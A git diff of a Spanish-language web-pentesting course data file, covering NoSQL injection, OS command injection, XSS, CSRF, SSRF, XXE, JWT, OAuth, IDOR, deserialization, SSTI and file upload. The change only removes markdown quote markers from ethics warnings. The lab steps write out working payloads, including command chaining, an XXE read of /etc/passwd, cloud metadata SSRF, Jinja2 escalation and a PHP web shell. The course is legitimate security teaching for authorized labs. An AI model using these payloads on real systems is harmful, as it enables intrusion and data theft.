+    "lab": "⚠️ Solo en tu laboratorio. 1. Localiza un login que reciba JSON ({\"username\":\"x\",\"password\":\"y\"}). 2. Con Burp, cambia el body a inyección de operador: ``json {\"username\":\"admin\",\"password\":{\"$ne\":\"\"}} ` 3. Observa si se produce el bypass de autenticación. 4. Prueba la variante por query string: username[$ne]=&password[$ne]=. 5. Para NoSQLi ciega, usa $regex para adivinar la contraseña: `json {\"u…",
     "exercises": [
       "Diferencia el payload en JSON del payload en query string para el mismo bypass.",
       "Reconstruye una contraseña de 8 caracteres con $regex blind.",
@@ -4912,7 +4912,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "100 min",
     "description": "Explotar la inyección de comandos del SO (OS command injection): cuando una aplicación pasa entrada del usuario a un shell del sistema, un atacante puede ejecutar comandos arbitrarios.",
-    "theory": "Explotar la inyección de comandos del SO (OS command injection): cuando una aplicación pasa entrada del usuario a un shell del sistema, un atacante puede ejecutar comandos arbitrarios. Es una de las vulnerabilidades de mayor impacto porque suele derivar en ejecución remota de código (RCE). > ⚠️ Ética: RCE es de máximo impacto. Practica exclusivamente en DVWA, PortSwigger labs o entornos con autorización escrita. Ejecutar comandos en sistemas ajenos es un delito grave.",
+    "theory": "Explotar la inyección de comandos del SO (OS command injection): cuando una aplicación pasa entrada del usuario a un shell del sistema, un atacante puede ejecutar comandos arbitrarios. Es una de las vulnerabilidades de mayor impacto porque suele derivar en ejecución remota de código (RCE). ⚠️ Ética: RCE es de máximo impacto. Practica exclusivamente en DVWA, PortSwigger labs o entornos con autorización escrita. Ejecutar comandos en sistemas ajenos es un delito grave.",
     "outcomes": [
       "Identificar puntos donde el input llega a un comando del sistema.",
       "Encadenar comandos con metacaracteres del shell (;, |, &&, $()).",
@@ -4942,7 +4942,7 @@ export const CLASSES = [
       "Burp para editar peticiones.",
       "netcat para escuchar la reverse shell en tu propia máquina de laboratorio."
     ],
-    "lab": "> ⚠️ Solo en DVWA/labs propios y aislados. 1. En DVWA → Command Injection, envía una IP normal (127.0.0.1) y observa el ping. 2. Encadena un comando: 127.0.0.1; whoami y verifica que se ejecuta. 3. Prueba otros separadores: | id, && uname -a, $(id). 4. Para command injection ciega (sin output), confirma con tiempo: 127.0.0.1; sleep 5. 5. Alternativa OOB: 127.0.0.1; nslookup $(whoami).tu-collabora…",
+    "lab": "⚠️ Solo en DVWA/labs propios y aislados. 1. En DVWA → Command Injection, envía una IP normal (127.0.0.1) y observa el ping. 2. Encadena un comando: 127.0.0.1; whoami y verifica que se ejecuta. 3. Prueba otros separadores: | id, && uname -a, $(id). 4. Para command injection ciega (sin output), confirma con tiempo: 127.0.0.1; sleep 5. 5. Alternativa OOB: 127.0.0.1; nslookup $(whoami).tu-collaborato…",
     "exercises": [
       "Enumera 5 metacaracteres distintos y en qué se diferencian al encadenar.",
       "Confirma una inyección ciega solo con retardo temporal.",
@@ -4963,7 +4963,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "110 min",
     "description": "Comprender y explotar el XSS reflejado: cuando la aplicación devuelve input del usuario en la respuesta sin sanitizar, permitiendo ejecutar JavaScript en el navegador de la víctima.",
-    "theory": "Comprender y explotar el XSS reflejado: cuando la aplicación devuelve input del usuario en la respuesta sin sanitizar, permitiendo ejecutar JavaScript en el navegador de la víctima. Es la puerta de entrada al mundo XSS y a los ataques del lado cliente. > ⚠️ Ética: solo en labs propios (DVWA, Juice Shop, PortSwigger). Ejecutar XSS contra usuarios reales sin permiso es ilegal.",
+    "theory": "Comprender y explotar el XSS reflejado: cuando la aplicación devuelve input del usuario en la respuesta sin sanitizar, permitiendo ejecutar JavaScript en el navegador de la víctima. Es la puerta de entrada al mundo XSS y a los ataques del lado cliente. ⚠️ Ética: solo en labs propios (DVWA, Juice Shop, PortSwigger). Ejecutar XSS contra usuarios reales sin permiso es ilegal.",
     "outcomes": [
       "Explicar el flujo de un XSS reflejado y su impacto.",
       "Identificar contextos de inyección (HTML, atributo, JS, URL).",
@@ -4993,7 +4993,7 @@ export const CLASSES = [
       "Burp para probar variaciones y observar reflexiones.",
       "Navegador con DevTools."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. En DVWA → XSS (Reflected), envía tu nombre y busca dónde se refleja en el HTML. 2. Prueba el payload básico: <script>alert(document.domain)</script>. 3. Si se filtra <script>, prueba manejadores de evento: <img src=x onerror=alert(1)>. 4. Identifica el contexto: ¿estás dentro de un atributo? Cierra comillas: \" onmouseover=\"alert(1). 5. Si aterrizas en un bloque <scri…",
+    "lab": "⚠️ Solo en labs propios. 1. En DVWA → XSS (Reflected), envía tu nombre y busca dónde se refleja en el HTML. 2. Prueba el payload básico: <script>alert(document.domain)</script>. 3. Si se filtra <script>, prueba manejadores de evento: <img src=x onerror=alert(1)>. 4. Identifica el contexto: ¿estás dentro de un atributo? Cierra comillas: \" onmouseover=\"alert(1). 5. Si aterrizas en un bloque <script…",
     "exercises": [
       "Diseña un payload para contexto de atributo y otro para contexto de script.",
       "Evade un filtro que elimina la palabra script (mayúsculas, anidado, eventos).",
@@ -5014,7 +5014,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Dominar las dos variantes de XSS más peligrosas: el almacenado (stored), que persiste y afecta a todos los usuarios, y el basado en DOM, que ocurre íntegramente en el navegador.",
-    "theory": "Dominar las dos variantes de XSS más peligrosas: el almacenado (stored), que persiste y afecta a todos los usuarios, y el basado en DOM, que ocurre íntegramente en el navegador. Aprenderás a rastrear el flujo de datos desde la fuente (source) hasta el punto de ejecución (sink). > ⚠️ Ética: solo en labs propios/autorizados. El stored XSS puede afectar a otros usuarios, así que nunca lo pruebes en producción ajena.",
+    "theory": "Dominar las dos variantes de XSS más peligrosas: el almacenado (stored), que persiste y afecta a todos los usuarios, y el basado en DOM, que ocurre íntegramente en el navegador. Aprenderás a rastrear el flujo de datos desde la fuente (source) hasta el punto de ejecución (sink). ⚠️ Ética: solo en labs propios/autorizados. El stored XSS puede afectar a otros usuarios, así que nunca lo pruebes en producción ajena.",
     "outcomes": [
       "Explotar XSS almacenado y evaluar su alcance (todos los usuarios).",
       "Rastrear flujos source→sink en JavaScript para DOM XSS.",
@@ -5044,7 +5044,7 @@ export const CLASSES = [
       "Burp y DevTools (breakpoints en sinks).",
       "Extensión mental de \"seguir el dato\": de dónde viene y dónde acaba."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Stored: en Juice Shop, busca un campo persistente (comentario, nombre de usuario) y guarda <img src=x onerror=alert(1)>. 2. Verifica que el payload se ejecuta al recargar la página desde otra sesión. 3. DOM XSS: localiza en el JS un sink como element.innerHTML = location.hash.slice(1). 4. Construye la URL con el payload en el #hash y confirma la ejecución. 5. Usa Dev…",
+    "lab": "⚠️ Solo en labs propios. 1. Stored: en Juice Shop, busca un campo persistente (comentario, nombre de usuario) y guarda <img src=x onerror=alert(1)>. 2. Verifica que el payload se ejecuta al recargar la página desde otra sesión. 3. DOM XSS: localiza en el JS un sink como element.innerHTML = location.hash.slice(1). 4. Construye la URL con el payload en el #hash y confirma la ejecución. 5. Usa DevTo…",
     "exercises": [
       "Enumera 5 sinks peligrosos en JavaScript y por qué lo son.",
       "Explica por qué el stored XSS es más grave que el reflejado.",
@@ -5065,7 +5065,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "90 min",
     "description": "Entender el CSRF (falsificación de petición entre sitios): forzar al navegador de una víctima autenticada a ejecutar acciones no deseadas.",
-    "theory": "Entender el CSRF (falsificación de petición entre sitios): forzar al navegador de una víctima autenticada a ejecutar acciones no deseadas. Aprenderás a construir PoCs, evaluar cuándo una defensa es efectiva y por qué SameSite y los tokens anti-CSRF funcionan. > ⚠️ Ética: solo en labs propios/autorizados. Un PoC de CSRF ejecuta acciones reales sobre la cuenta de la víctima.",
+    "theory": "Entender el CSRF (falsificación de petición entre sitios): forzar al navegador de una víctima autenticada a ejecutar acciones no deseadas. Aprenderás a construir PoCs, evaluar cuándo una defensa es efectiva y por qué SameSite y los tokens anti-CSRF funcionan. ⚠️ Ética: solo en labs propios/autorizados. Un PoC de CSRF ejecuta acciones reales sobre la cuenta de la víctima.",
     "outcomes": [
       "Explicar las condiciones necesarias para un CSRF explotable.",
       "Construir un PoC HTML (GET y POST) que dispare la acción.",
@@ -5095,7 +5095,7 @@ export const CLASSES = [
       "Burp (Community incluye un generador de PoC de CSRF).",
       "Un servidor local simple para alojar el PoC en tu laboratorio."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. En DVWA → CSRF, identifica la petición que cambia la contraseña. 2. Comprueba si requiere token anti-CSRF. Si no, es explotable. 3. Genera un PoC con Burp (clic derecho en la request → Engagement tools → Generate CSRF PoC). 4. Aloja el PoC en tu servidor de lab y ábrelo con una sesión de víctima activa: ``html <form action=\"http://dvwa.local/vulnerabilities/csrf/\" me…",
+    "lab": "⚠️ Solo en labs propios. 1. En DVWA → CSRF, identifica la petición que cambia la contraseña. 2. Comprueba si requiere token anti-CSRF. Si no, es explotable. 3. Genera un PoC con Burp (clic derecho en la request → Engagement tools → Generate CSRF PoC). 4. Aloja el PoC en tu servidor de lab y ábrelo con una sesión de víctima activa: ``html <form action=\"http://dvwa.local/vulnerabilities/csrf/\" meth…",
     "exercises": [
       "Construye un PoC GET y otro POST para la misma acción.",
       "Explica por qué SameSite=Strict puede romper flujos legítimos.",
@@ -5116,7 +5116,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Explotar el SSRF (falsificación de petición del lado servidor): hacer que el servidor realice peticiones a destinos que el atacante controla, incluyendo servicios internos y endpoints de metadata cloud.",
-    "theory": "Explotar el SSRF (falsificación de petición del lado servidor): hacer que el servidor realice peticiones a destinos que el atacante controla, incluyendo servicios internos y endpoints de metadata cloud. Es una de las vulnerabilidades de mayor impacto en entornos modernos y una categoría propia del OWASP Top 10. > ⚠️ Ética: solo en labs propios/autorizados (PortSwigger, Juice Shop). Alcanzar redes internas ajenas es un delito.",
+    "theory": "Explotar el SSRF (falsificación de petición del lado servidor): hacer que el servidor realice peticiones a destinos que el atacante controla, incluyendo servicios internos y endpoints de metadata cloud. Es una de las vulnerabilidades de mayor impacto en entornos modernos y una categoría propia del OWASP Top 10. ⚠️ Ética: solo en labs propios/autorizados (PortSwigger, Juice Shop). Alcanzar redes internas ajenas es un delito.",
     "outcomes": [
       "Identificar funciones que hacen que el servidor pida URLs (webhooks, importadores, previews).",
       "Explotar SSRF para alcanzar localhost y la red interna.",
@@ -5146,7 +5146,7 @@ export const CLASSES = [
       "Burp Collaborator o servidor propio para OOB.",
       "Conocer los endpoints de metadata de cada nube (documentación oficial)."
     ],
-    "lab": "> ⚠️ Solo en labs propios/autorizados. 1. Localiza una función que reciba una URL (importar imagen, webhook, comprobar stock). 2. Cambia la URL a http://localhost/admin y observa si el servidor la alcanza. 3. Escanea puertos internos cambiando el puerto en la URL y midiendo respuestas/tiempos. 4. En el lab cloud de PortSwigger, apunta al endpoint de metadata: ``text http://169.254.169.254/latest/…",
+    "lab": "⚠️ Solo en labs propios/autorizados. 1. Localiza una función que reciba una URL (importar imagen, webhook, comprobar stock). 2. Cambia la URL a http://localhost/admin y observa si el servidor la alcanza. 3. Escanea puertos internos cambiando el puerto en la URL y midiendo respuestas/tiempos. 4. En el lab cloud de PortSwigger, apunta al endpoint de metadata: ``text http://169.254.169.254/latest/me…",
     "exercises": [
       "Enumera 5 features típicas que introducen SSRF.",
       "Explica por qué el endpoint de metadata es tan crítico.",
@@ -5167,7 +5167,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "100 min",
     "description": "Explotar vulnerabilidades XXE (XML External Entities): abusar de parsers XML mal configurados para leer archivos locales, provocar SSRF y, en casos ciegos, exfiltrar datos out-of-band.",
-    "theory": "Explotar vulnerabilidades XXE (XML External Entities): abusar de parsers XML mal configurados para leer archivos locales, provocar SSRF y, en casos ciegos, exfiltrar datos out-of-band. Es un fallo clásico que sigue apareciendo en importadores, SOAP, SAML y formatos basados en XML. > ⚠️ Ética: solo en labs propios/autorizados. Leer archivos del servidor ajeno es un delito.",
+    "theory": "Explotar vulnerabilidades XXE (XML External Entities): abusar de parsers XML mal configurados para leer archivos locales, provocar SSRF y, en casos ciegos, exfiltrar datos out-of-band. Es un fallo clásico que sigue apareciendo en importadores, SOAP, SAML y formatos basados en XML. ⚠️ Ética: solo en labs propios/autorizados. Leer archivos del servidor ajeno es un delito.",
     "outcomes": [
       "Explicar qué son las entidades externas y por qué son peligrosas.",
       "Leer archivos del servidor con XXE in-band.",
@@ -5197,7 +5197,7 @@ export const CLASSES = [
       "Burp para editar cuerpos XML.",
       "Servidor propio para alojar el DTD externo en XXE ciega."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Encuentra un endpoint que acepte XML (importar datos, SOAP, comprobar stock). 2. Inyecta una entidad externa para leer un archivo: ``xml <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <stockCheck><productId>&xxe;</productId></stockCheck> ` 3. Observa el contenido del archivo reflejado en la respuesta. 4. Convierte el XXE en SSRF ap…",
+    "lab": "⚠️ Solo en labs propios. 1. Encuentra un endpoint que acepte XML (importar datos, SOAP, comprobar stock). 2. Inyecta una entidad externa para leer un archivo: ``xml <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <stockCheck><productId>&xxe;</productId></stockCheck> ` 3. Observa el contenido del archivo reflejado en la respuesta. 4. Convierte el XXE en SSRF apun…",
     "exercises": [
       "Lee /etc/hostname y /etc/passwd en el lab y explica la diferencia de impacto.",
       "Transforma un XXE de lectura en un SSRF a metadata.",
@@ -5218,7 +5218,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Auditar los mecanismos de autenticación y descubrir formas de saltárselos: enumeración de usuarios, fuerza bruta, fallos en recuperación de contraseña, MFA débil y lógica de login rota.",
-    "theory": "Auditar los mecanismos de autenticación y descubrir formas de saltárselos: enumeración de usuarios, fuerza bruta, fallos en recuperación de contraseña, MFA débil y lógica de login rota. La autenticación es la puerta de la aplicación; romperla suele ser el hallazgo de mayor impacto. > ⚠️ Ética: solo en labs propios/autorizados. La fuerza bruta y el bypass sobre cuentas ajenas son delitos.",
+    "theory": "Auditar los mecanismos de autenticación y descubrir formas de saltárselos: enumeración de usuarios, fuerza bruta, fallos en recuperación de contraseña, MFA débil y lógica de login rota. La autenticación es la puerta de la aplicación; romperla suele ser el hallazgo de mayor impacto. ⚠️ Ética: solo en labs propios/autorizados. La fuerza bruta y el bypass sobre cuentas ajenas son delitos.",
     "outcomes": [
       "Detectar enumeración de usuarios por diferencias en respuestas/tiempos.",
       "Ejecutar fuerza bruta controlada y credential stuffing en un lab.",
@@ -5248,7 +5248,7 @@ export const CLASSES = [
       "Burp Intruder para fuerza bruta y enumeración.",
       "Listas de usuarios/contraseñas de SecLists."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Prueba el login con un usuario inexistente y otro existente; compara mensajes y tiempos (enumeración). 2. Con Intruder, enumera usuarios válidos por diferencia de respuesta. 3. Ejecuta fuerza bruta de contraseña sobre un usuario válido en un lab sin rate limiting. 4. Analiza el flujo de recuperación de contraseña: ¿el token es predecible?, ¿expira?, ¿se puede reusar?…",
+    "lab": "⚠️ Solo en labs propios. 1. Prueba el login con un usuario inexistente y otro existente; compara mensajes y tiempos (enumeración). 2. Con Intruder, enumera usuarios válidos por diferencia de respuesta. 3. Ejecuta fuerza bruta de contraseña sobre un usuario válido en un lab sin rate limiting. 4. Analiza el flujo de recuperación de contraseña: ¿el token es predecible?, ¿expira?, ¿se puede reusar? 5…",
     "exercises": [
       "Detecta enumeración de usuarios por mensaje y por tiempo, por separado.",
       "Diseña un ataque de credential stuffing y explica su defensa (MFA, detección de reuso).",
@@ -5269,7 +5269,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "100 min",
     "description": "Analizar cómo las aplicaciones mantienen el estado de sesión tras el login y los ataques que lo comprometen: predicción y fijación de sesión, gestión insegura de cookies y fallos de logout.",
-    "theory": "Analizar cómo las aplicaciones mantienen el estado de sesión tras el login y los ataques que lo comprometen: predicción y fijación de sesión, gestión insegura de cookies y fallos de logout. Una sesión mal gestionada anula toda la seguridad de una autenticación fuerte. > ⚠️ Ética: solo en labs propios/autorizados. Secuestrar sesiones ajenas es un delito.",
+    "theory": "Analizar cómo las aplicaciones mantienen el estado de sesión tras el login y los ataques que lo comprometen: predicción y fijación de sesión, gestión insegura de cookies y fallos de logout. Una sesión mal gestionada anula toda la seguridad de una autenticación fuerte. ⚠️ Ética: solo en labs propios/autorizados. Secuestrar sesiones ajenas es un delito.",
     "outcomes": [
       "Analizar la entropía y predictibilidad de los identificadores de sesión.",
       "Explotar fijación de sesión (session fixation).",
@@ -5299,7 +5299,7 @@ export const CLASSES = [
       "PortSwigger labs y DVWA.",
       "DevTools para inspeccionar cookies y atributos."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Inicia sesión y captura el session ID; inspecciona sus atributos en DevTools. 2. Recolecta muchos tokens y analiza su aleatoriedad con Burp Sequencer. 3. Comprueba si el ID rota tras el login (defensa contra fixation). Si no, es explotable. 4. Simula session fixation: fija un ID antes del login de la víctima y verifica si se mantiene. 5. Revisa flags: ¿HttpOnly?, ¿Se…",
+    "lab": "⚠️ Solo en labs propios. 1. Inicia sesión y captura el session ID; inspecciona sus atributos en DevTools. 2. Recolecta muchos tokens y analiza su aleatoriedad con Burp Sequencer. 3. Comprueba si el ID rota tras el login (defensa contra fixation). Si no, es explotable. 4. Simula session fixation: fija un ID antes del login de la víctima y verifica si se mantiene. 5. Revisa flags: ¿HttpOnly?, ¿Secu…",
     "exercises": [
       "Evalúa la entropía de un token con Sequencer y explica el resultado.",
       "Reproduce una session fixation en un lab que no rote el ID.",
@@ -5320,7 +5320,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "110 min",
     "description": "Auditar la seguridad de los JSON Web Tokens (JWT), hoy omnipresentes en APIs y SPAs.",
-    "theory": "Auditar la seguridad de los JSON Web Tokens (JWT), hoy omnipresentes en APIs y SPAs. Aprenderás a decodificarlos, detectar implementaciones inseguras y explotar fallos clásicos: alg:none, confusión de algoritmos, claves débiles y falta de verificación de firma. > ⚠️ Ética: solo en labs propios/autorizados. Forjar tokens de sistemas ajenos es un delito.",
+    "theory": "Auditar la seguridad de los JSON Web Tokens (JWT), hoy omnipresentes en APIs y SPAs. Aprenderás a decodificarlos, detectar implementaciones inseguras y explotar fallos clásicos: alg:none, confusión de algoritmos, claves débiles y falta de verificación de firma. ⚠️ Ética: solo en labs propios/autorizados. Forjar tokens de sistemas ajenos es un delito.",
     "outcomes": [
       "Decodificar y comprender la estructura de un JWT (header, payload, signature).",
       "Explotar el ataque alg:none y la aceptación de firma vacía.",
@@ -5351,7 +5351,7 @@ export const CLASSES = [
       "hashcat o John the Ripper para crackear secretos.",
       "PortSwigger labs de JWT."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Captura un JWT y decodifícalo con jwt.io o jwt_tool para ver header y claims. 2. Prueba el ataque alg:none: cambia \"alg\":\"none\", elimina la firma y modifica un claim (p. ej. role: admin). 3. Si usa RS256, intenta confusión de algoritmos: firma un HS256 usando la clave pública del servidor como secreto. 4. Si es HS256, extrae el token y crackea el secreto con hashcat:…",
+    "lab": "⚠️ Solo en labs propios. 1. Captura un JWT y decodifícalo con jwt.io o jwt_tool para ver header y claims. 2. Prueba el ataque alg:none: cambia \"alg\":\"none\", elimina la firma y modifica un claim (p. ej. role: admin). 3. Si usa RS256, intenta confusión de algoritmos: firma un HS256 usando la clave pública del servidor como secreto. 4. Si es HS256, extrae el token y crackea el secreto con hashcat: `…",
     "exercises": [
       "Explica cada parte de un JWT y qué contiene el payload.",
       "Reproduce el ataque alg:none en un lab de PortSwigger.",
@@ -5372,7 +5372,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "120 min",
     "description": "Comprender y auditar OAuth 2.0 y OpenID Connect (OIDC), la base del \"login con Google/GitHub\" y de la delegación de acceso en APIs.",
-    "theory": "Comprender y auditar OAuth 2.0 y OpenID Connect (OIDC), la base del \"login con Google/GitHub\" y de la delegación de acceso en APIs. Verás los flujos, sus piezas y los ataques clásicos: redirect_uri laxo, robo de code, CSRF por falta de state y confusión de tokens. > ⚠️ Ética: solo en labs propios/autorizados. Robar tokens o cuentas ajenas es un delito.",
+    "theory": "Comprender y auditar OAuth 2.0 y OpenID Connect (OIDC), la base del \"login con Google/GitHub\" y de la delegación de acceso en APIs. Verás los flujos, sus piezas y los ataques clásicos: redirect_uri laxo, robo de code, CSRF por falta de state y confusión de tokens. ⚠️ Ética: solo en labs propios/autorizados. Robar tokens o cuentas ajenas es un delito.",
     "outcomes": [
       "Describir el flujo Authorization Code y el rol de cada parámetro.",
       "Explotar validación débil de redirect_uri para robar el code/token.",
@@ -5402,7 +5402,7 @@ export const CLASSES = [
       "Burp para interceptar el flujo (autorización, callback, intercambio).",
       "Un proveedor de identidad de laboratorio o el simulado por el lab."
     ],
-    "lab": "> ⚠️ Solo en labs propios/autorizados. 1. Intercepta el flujo completo con Burp: /authorize → consentimiento → redirect_uri?code=... → intercambio de token. 2. Modifica el redirect_uri a un dominio controlado y observa si el servidor lo acepta (validación laxa). 3. Si lo acepta, captura el code enviado a tu dominio y complétalo por un token. 4. Comprueba la presencia del parámetro state; si falta…",
+    "lab": "⚠️ Solo en labs propios/autorizados. 1. Intercepta el flujo completo con Burp: /authorize → consentimiento → redirect_uri?code=... → intercambio de token. 2. Modifica el redirect_uri a un dominio controlado y observa si el servidor lo acepta (validación laxa). 3. Si lo acepta, captura el code enviado a tu dominio y complétalo por un token. 4. Comprueba la presencia del parámetro state; si falta,…",
     "exercises": [
       "Dibuja el flujo Authorization Code con PKCE, parámetro a parámetro.",
       "Explica cómo un redirect_uri con validación por prefijo se puede evadir.",
@@ -5423,7 +5423,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "110 min",
     "description": "Explotar el control de acceso roto (Broken Access Control), la categoría número 1 del OWASP Top 10.",
-    "theory": "Explotar el control de acceso roto (Broken Access Control), la categoría número 1 del OWASP Top 10. Nos centramos en IDOR (referencias directas inseguras a objetos) y path traversal (acceso a archivos fuera del directorio permitido), dos de los hallazgos más frecuentes y rentables en bug bounty. > ⚠️ Ética: solo en labs propios/autorizados. Acceder a datos de otros usuarios reales es un delito.",
+    "theory": "Explotar el control de acceso roto (Broken Access Control), la categoría número 1 del OWASP Top 10. Nos centramos en IDOR (referencias directas inseguras a objetos) y path traversal (acceso a archivos fuera del directorio permitido), dos de los hallazgos más frecuentes y rentables en bug bounty. ⚠️ Ética: solo en labs propios/autorizados. Acceder a datos de otros usuarios reales es un delito.",
     "outcomes": [
       "Detectar IDOR manipulando identificadores en peticiones.",
       "Diferenciar control de acceso horizontal y vertical.",
@@ -5453,7 +5453,7 @@ export const CLASSES = [
       "PortSwigger labs de access control y Juice Shop.",
       "Dos cuentas de prueba (usuario A y usuario B) para comparar accesos."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Autentícate como usuario A y localiza una petición con un ID (/api/orders/1001). 2. Cambia el ID a 1002 y observa si accedes a datos de otro usuario (IDOR horizontal). 3. Automatiza con Intruder para enumerar objetos accesibles. 4. Prueba escalada vertical: accede a /admin o a endpoints de administración con tu sesión normal. 5. Explota path traversal en un parámetro…",
+    "lab": "⚠️ Solo en labs propios. 1. Autentícate como usuario A y localiza una petición con un ID (/api/orders/1001). 2. Cambia el ID a 1002 y observa si accedes a datos de otro usuario (IDOR horizontal). 3. Automatiza con Intruder para enumerar objetos accesibles. 4. Prueba escalada vertical: accede a /admin o a endpoints de administración con tu sesión normal. 5. Explota path traversal en un parámetro d…",
     "exercises": [
       "Diferencia con ejemplos IDOR horizontal y escalada vertical.",
       "Explota un IDOR donde el identificador es un UUID (busca la fuente del UUID).",
@@ -5474,7 +5474,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "120 min",
     "description": "Comprender y explotar la deserialización insegura: cuando una aplicación reconstruye objetos a partir de datos controlados por el atacante, permitiendo desde manipulación de estado hasta ejecución remota de código (RCE)…",
-    "theory": "Comprender y explotar la deserialización insegura: cuando una aplicación reconstruye objetos a partir de datos controlados por el atacante, permitiendo desde manipulación de estado hasta ejecución remota de código (RCE) mediante cadenas de gadgets. Es un fallo complejo pero de altísimo impacto. > ⚠️ Ética: RCE de máximo impacto. Practica solo en labs propios/autorizados (PortSwigger). Nunca contra sistemas ajenos.",
+    "theory": "Comprender y explotar la deserialización insegura: cuando una aplicación reconstruye objetos a partir de datos controlados por el atacante, permitiendo desde manipulación de estado hasta ejecución remota de código (RCE) mediante cadenas de gadgets. Es un fallo complejo pero de altísimo impacto. ⚠️ Ética: RCE de máximo impacto. Practica solo en labs propios/autorizados (PortSwigger). Nunca contra sistemas ajenos.",
     "outcomes": [
       "Explicar qué es serializar/deserializar y por qué es riesgoso con datos no confiables.",
       "Manipular objetos serializados para alterar el estado de la app.",
@@ -5504,7 +5504,7 @@ export const CLASSES = [
       "ysoserial (Java) y ysoserial.net (.NET).",
       "Burp para manipular los objetos serializados en cookies/parámetros."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Identifica datos serializados (cookies con Base64 que decodifican a objetos, campos O:8:... en PHP). 2. En un lab PHP, decodifica el objeto serializado y manipula un atributo (p. ej. admin=true), reserializa y reenvía. 3. Observa el cambio de estado/privilegio. 4. En un lab Java, detecta el objeto serializado y usa ysoserial para generar una gadget chain que ejecute…",
+    "lab": "⚠️ Solo en labs propios. 1. Identifica datos serializados (cookies con Base64 que decodifican a objetos, campos O:8:... en PHP). 2. En un lab PHP, decodifica el objeto serializado y manipula un atributo (p. ej. admin=true), reserializa y reenvía. 3. Observa el cambio de estado/privilegio. 4. En un lab Java, detecta el objeto serializado y usa ysoserial para generar una gadget chain que ejecute un…",
     "exercises": [
       "Decodifica y modifica un objeto PHP serializado para escalar privilegios.",
       "Explica qué es una gadget chain y por qué depende de las librerías presentes.",
@@ -5525,7 +5525,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "110 min",
     "description": "Explotar la inyección de plantillas del lado servidor (SSTI): cuando el input del usuario se evalúa como parte de una plantilla (Jinja2, Twig, Freemarker, etc.), permitiendo desde filtración de datos hasta RCE.",
-    "theory": "Explotar la inyección de plantillas del lado servidor (SSTI): cuando el input del usuario se evalúa como parte de una plantilla (Jinja2, Twig, Freemarker, etc.), permitiendo desde filtración de datos hasta RCE. Es un fallo potente que aparece en emails personalizados, generación de documentos y paneles configurables. > ⚠️ Ética: puede derivar en RCE. Solo en labs propios/autorizados (PortSwigger). Nunca en sistemas ajenos.",
+    "theory": "Explotar la inyección de plantillas del lado servidor (SSTI): cuando el input del usuario se evalúa como parte de una plantilla (Jinja2, Twig, Freemarker, etc.), permitiendo desde filtración de datos hasta RCE. Es un fallo potente que aparece en emails personalizados, generación de documentos y paneles configurables. ⚠️ Ética: puede derivar en RCE. Solo en labs propios/autorizados (PortSwigger). Nunca en sistemas ajenos.",
     "outcomes": [
       "Detectar SSTI con payloads de prueba matemáticos.",
       "Identificar el motor de plantillas por su comportamiento.",
@@ -5555,7 +5555,7 @@ export const CLASSES = [
       "tplmap (automatización, con criterio).",
       "Burp para probar payloads."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Introduce {{77}} y ${77} en campos que se reflejan (nombre, plantilla de email). 2. Si obtienes 49, confirma SSTI e identifica el motor con payloads diferenciadores. 3. En Jinja2 (Python), escala a lectura de configuración y luego a ejecución: ``text {{ config.items() }} {{ ''.__class__.__mro__[1].__subclasses__() }} `` 4. Encuentra un subclass que permita ejecutar c…",
+    "lab": "⚠️ Solo en labs propios. 1. Introduce {{77}} y ${77} en campos que se reflejan (nombre, plantilla de email). 2. Si obtienes 49, confirma SSTI e identifica el motor con payloads diferenciadores. 3. En Jinja2 (Python), escala a lectura de configuración y luego a ejecución: ``text {{ config.items() }} {{ ''.__class__.__mro__[1].__subclasses__() }} `` 4. Encuentra un subclass que permita ejecutar com…",
     "exercises": [
       "Diferencia la respuesta de {{7*7}} en SSTI de un simple reflejo de texto.",
       "Haz fingerprinting distinguiendo Jinja2 de Twig con payloads.",
@@ -5576,7 +5576,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "100 min",
     "description": "Explotar fallos en la carga de archivos (file upload): subir contenido malicioso que la aplicación acepta y ejecuta o sirve de forma peligrosa.",
-    "theory": "Explotar fallos en la carga de archivos (file upload): subir contenido malicioso que la aplicación acepta y ejecuta o sirve de forma peligrosa. Un upload mal validado puede convertirse en web shell (RCE), XSS almacenado, path traversal o SSRF. > ⚠️ Ética: subir una web shell equivale a RCE. Solo en labs propios/autorizados (DVWA, PortSwigger). Nunca en sistemas ajenos.",
+    "theory": "Explotar fallos en la carga de archivos (file upload): subir contenido malicioso que la aplicación acepta y ejecuta o sirve de forma peligrosa. Un upload mal validado puede convertirse en web shell (RCE), XSS almacenado, path traversal o SSRF. ⚠️ Ética: subir una web shell equivale a RCE. Solo en labs propios/autorizados (DVWA, PortSwigger). Nunca en sistemas ajenos.",
     "outcomes": [
       "Identificar qué validaciones aplica un formulario de subida.",
       "Evadir filtros por extensión, Content-Type y magic bytes.",
@@ -5606,7 +5606,7 @@ export const CLASSES = [
       "Burp para modificar el nombre, extensión y Content-Type en la petición.",
       "Una web shell mínima de laboratorio (p. ej. PHP que ejecute $_GET['cmd'])."
     ],
